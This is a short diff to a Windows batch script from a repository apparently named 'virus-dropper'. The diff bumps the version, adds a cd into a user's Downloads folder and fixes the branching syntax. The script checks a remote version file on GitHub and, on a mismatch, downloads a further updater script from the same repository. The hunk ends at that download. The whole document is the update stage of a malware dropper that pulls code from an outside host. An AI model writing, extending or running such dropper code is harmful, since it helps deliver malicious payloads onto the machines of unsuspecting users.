@@ -1,8 +1,9 @@
 @echo off
-set /a version=2
+cd C:\users\edwar\downloads
+set /a version=3
 @SET output=
 FOR /F %%I IN ('curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/updater/version.txt"') DO @SET "output=%%I"
-If %output% == %version% "exit" ELSE "goto update"
+If %output% == %version% exit ELSE goto update
 
 :update
 curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/updater/updater.bat" --output "Updater.bat"
